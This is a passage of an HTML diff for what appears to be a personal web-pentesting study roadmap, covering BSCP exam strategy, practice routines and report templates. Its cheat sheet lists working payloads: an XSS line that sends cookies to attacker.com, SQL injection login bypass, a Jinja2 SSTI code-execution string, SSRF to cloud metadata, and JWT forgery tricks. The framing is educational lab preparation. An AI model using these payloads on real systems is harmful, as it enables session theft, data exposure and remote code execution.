+                    <div class="section-summary">
+                        issued by PortSwigger (makers of Burp Suite). 4-hour exam, 2 web applications, 3 vulnerabilities each to exploit in sequence.
+                        open book — notes and internet allowed. Burp Suite Professional required.
+                        considered harder than CWES due to the time pressure and the need to chain vulnerabilities without hints.
+                    </div>
+                    <div class="item" id="i-bscp-stages">
+                        <button class="item-header" onclick="toggleItem('i-bscp-stages')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">the three-stage structure and how to approach each</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                each app has three stages that must be completed in order. stage 1 gives you a foothold (regular user access). stage 2 escalates to admin. stage 3 achieves data exfiltration or RCE.
+                                you budget roughly 40 minutes per stage. if you're stuck at 30 minutes, move on and come back — leaving a stage incomplete to make progress elsewhere is smarter than burning the entire 4 hours on one exploit.
+                            </div>
+                            <div class="code-label">// stage patterns and time budget</div>
+                            <div class="code-block">stage 1 — foothold (common vectors):
+  XSS to steal admin cookie, username enumeration + brute force,
+  content discovery finding an unprotected login bypass,
+  SQL injection on the login form
+
+stage 2 — privilege escalation (common vectors):
+  SQL injection, JWT manipulation, broken access control,
+  password reset token flaw, CSRF via XSS from stage 1
+
+stage 3 — data exfiltration / RCE (common vectors):
+  XXE injection, SSRF, SSTI, file path traversal, deserialization
+
+time budget:
+  40min × 3 stages × 2 apps = 4 hours exactly
+  finish one stage faster → bank that time for a harder one.
+  30-minute rule: no progress in 30min → move on, come back.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-bscp-notes">
+                        <button class="item-header" onclick="toggleItem('i-bscp-notes')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">building your exam cheat sheet — the open-book advantage</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                the exam is open-book but you can't afford to google during a 40-minute window.
+                                build a personal cheat sheet with one working payload per vulnerability class, exact Burp configuration steps, and the bypass technique when the basic payload fails.
+                                this document is built during your PortSwigger lab practice — after every lab you solve, add the key payload to your notes.
+                            </div>
+                            <div class="code-label">// cheat sheet structure (built over months of practice)</div>
+                            <div class="code-block">[XSS] basic:          <script>alert(1)</script>
+[XSS] cookie steal:   <script>fetch('//attacker.com?c='+document.cookie)</script>
+[XSS] HttpOnly bypass: use XSS+CSRF — perform action as victim via fetch()
+
+[SQLi] login bypass:  admin'--
+[SQLi] find cols:     ' ORDER BY N-- (increment N until error)
+[SQLi] union extract: ' UNION SELECT col1,col2 FROM tablename--
+
+[SSTI] detect:        {{7*7}} ${7*7} #{7*7} — look for 49 in response
+[SSTI] Jinja2 RCE:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+[SSRF] basic:         replace URL param with http://127.0.0.1/admin
+[SSRF] cloud:         http://169.254.169.254/latest/meta-data/
+
+[JWT] alg:none:       set alg:none, change payload, remove signature
+[JWT] confusion:      get pubkey from jwks.json, sign with HS256 using it as secret</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 7 — PRACTICE
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-7">
+        <button class="phase-header" onclick="togglePhase('phase-7')">
+            <span class="phase-num">phase 07</span>
+            <span class="phase-title">PRACTICE & CONSISTENCY — building real skill</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                knowledge without repetition is trivia. the difference between someone who knows web pentesting and someone who is a web pentester is pattern recognition built through volume.
+                the three-platform loop below is the most efficient path: structured learning, unlimited free practice, realistic simulation.
+            </div>
+
+            <div class="section-block" id="s7-loop">
+                <button class="section-header" onclick="toggleSection('s7-loop')">
+                    <span class="section-title">the three-platform practice loop</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        HTB Academy for structured module learning. PortSwigger Web Security Academy for unlimited free vulnerability-class practice.
+                        HTB main platform for realistic machine simulation. rotate between all three.
+                    </div>
+                    <div class="item" id="i-loop">
+                        <button class="item-header" onclick="toggleItem('i-loop')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">weekly practice structure that compounds over time</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                the goal is consistent reps, not binge sessions. 2-3 hours daily compounds faster than 10 hours on weekends with gaps in between.
+                                key discipline: attempt every lab/box for at least 30 minutes before looking at solutions. the struggle is where learning happens.
+                            </div>
+                            <div class="code-label">// sustainable weekly structure</div>
+                            <div class="code-block">monday:    HTB Academy — cover new module sections (theory + labs)
+tuesday:   PortSwigger — 2-3 Apprentice labs on that vuln class
+wednesday: PortSwigger — 2 Practitioner labs (harder, no solutions first)
+thursday:  HTB main — box that uses the same vuln class
+           (use ippsec.rocks to filter boxes by vulnerability type)
+friday:    write up the box / labs → publish to your writeups repo
+weekend:   PortSwigger Mystery Labs — blind solving, no topic given
+           (exact BSCP exam condition — you must identify the vuln yourself)
+
+every writeup published: permanent public proof of work.
+every mystery lab solved: direct BSCP exam preparation.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s7-writeups">
+                <button class="section-header" onclick="toggleSection('s7-writeups')">
+                    <span class="section-title">CTF writeups — public proof of technical thinking</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        a recruiter reading a writeup sees how you think — not just that you got the flag.
+                        writeups that clearly explain discovery, exploitation, and lessons learned are more convincing than any certification badge alone.
+                        the ctf-writeups repo is the most important piece of the portfolio.
+                    </div>
+                    <div class="item" id="i-writeup">
+                        <button class="item-header" onclick="toggleItem('i-writeup')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">writeup structure that impresses technical reviewers</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="code-label">// standard writeup template</div>
+                            <div class="code-block">## [Machine/Lab Name] — [Platform] — [Difficulty]
+
+### summary
+- target: IP / URL
+- key vulnerabilities: SQLi → LFI → RCE
+- tools used: nmap, ffuf, Burp Suite, sqlmap
+
+### recon
+- nmap findings: open ports, service versions
+- web fingerprinting: tech stack, frameworks
+- directory discovery: notable finds
+
+### exploitation
+#### vulnerability 1: [name]
+- how i found it: [observation that triggered investigation]
+- why it works: [explanation of the root cause]
+- payload used: [exact payload]
+- screenshot: [evidence]
+
+#### vulnerability 2: [name and so on]
+
+### lessons learned
+- what i'd do differently
+- new technique i learned
+- time spent: Xh
+
+---
+tags: sqli, lfi, rce, linux, medium</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 8 — REPORTING
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-8">
+        <button class="phase-header" onclick="togglePhase('phase-8')">
+            <span class="phase-num">phase 08</span>
+            <span class="phase-title">REPORTING — the skill that actually gets you hired</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                technical skill finds the vulnerability. reporting skill communicates it in a way that justifies your day rate, earns client trust, and gets the contract renewed.
+                a critical RCE documented poorly is less valuable than a medium SQLi documented with precision.
+                reporting is a written communication skill as much as a technical one. it's also mandatory for both CWES and BSCP.
+            </div>
+
+            <div class="section-block" id="s8-report">
+                <button class="section-header" onclick="toggleSection('s8-report')">
+                    <span class="section-title">professional pentest report structure</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        a pentest report has two audiences: the executive (non-technical, needs business impact) and the developer (technical, needs reproduction steps and remediation).
+                        both are served by the same document with different sections.
+                    </div>
+                    <div class="item" id="i-exec-summary">
+                        <button class="item-header" onclick="toggleItem('i-exec-summary')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">executive summary — 2 paragraphs, business language</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                the CISO or CTO reads this. no CVE IDs, no payload syntax, no jargon.
+                                business risk, number of findings by severity, the single most critical thing they need to fix immediately.
+                            </div>
+                            <div class="code-label">// executive summary example</div>
+                            <div class="code-block">During the engagement period from January 15–22, 2025, a web application
+penetration test was conducted against Target Corp's customer portal.
+A total of 9 vulnerabilities were identified: 2 Critical, 3 High, 3 Medium,
+and 1 Low severity.
+
+The most critical finding — a SQL injection vulnerability in the login
+endpoint — allows an unauthenticated attacker to access all customer
+records without valid credentials. Immediate remediation of the two
+Critical findings is recommended before the next production release.
+The remaining High severity findings should be addressed within 30 days.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-finding">
+                        <button class="item-header" onclick="toggleItem('i-finding')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">individual finding format — the technical section</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                each finding gets its own page minimum. a developer who wasn't present must be able to reproduce the vulnerability exactly by following your steps.
+                                CVSS score is mandatory — it's the industry-standard risk rating system and shows you understand risk quantification.
+                            </div>
+                            <div class="code-label">// complete finding template</div>
+                            <div class="code-block">title:    Insecure Direct Object Reference — Invoice Endpoint
+severity: High
+cvss:     7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
+cwe:      CWE-284: Improper Access Control
+
+description:
+  The /api/v1/invoices/{id} endpoint does not verify that the
+  authenticated user owns the requested invoice. Any authenticated
+  user can access any invoice by incrementing the ID parameter.
+
+affected endpoint:
+  GET /api/v1/invoices/{id}
+
+proof of concept:
+  1. Log in as any regular user account
+  2. Navigate to your own invoice: GET /api/v1/invoices/1001
+  3. Modify the ID in the request: GET /api/v1/invoices/1000
+  4. Observe that another user's invoice data is returned
+
+evidence:
+  [screenshot of Burp request/response showing unauthorized access]
+
+impact:
+  An attacker with any valid account can enumerate and read all
+  customer invoices, exposing financial data, PII, and business details.
+
+remediation:
+  Verify server-side that the invoice belongs to the requesting user
+  before returning data. Do not rely on client-side controls.
+  Reference: OWASP IDOR Prevention Cheat Sheet</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <a href="index.html" class="back-link">&lt; back to profile</a>
+
+    <div class="philosophy">
+        "the only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." — gene spafford
+    </div>
+
+</div>
+
+<script>
+    function togglePhase(id) {
+        const el = document.getElementById(id);
+        el.classList.toggle('open');
+    }
+
+    function toggleSection(id) {
+        const el = document.getElementById(id);
+        el.classList.toggle('open');
+    }
+
+    function toggleItem(id) {
+        const el = document.getElementById(id);
+        el.classList.toggle('open');
+    }
+
+    function toggleLang(id) {
+        const el = document.getElementById(id);
+        el.classList.toggle('open');
+    }
+</script>
+</body>
+</html>
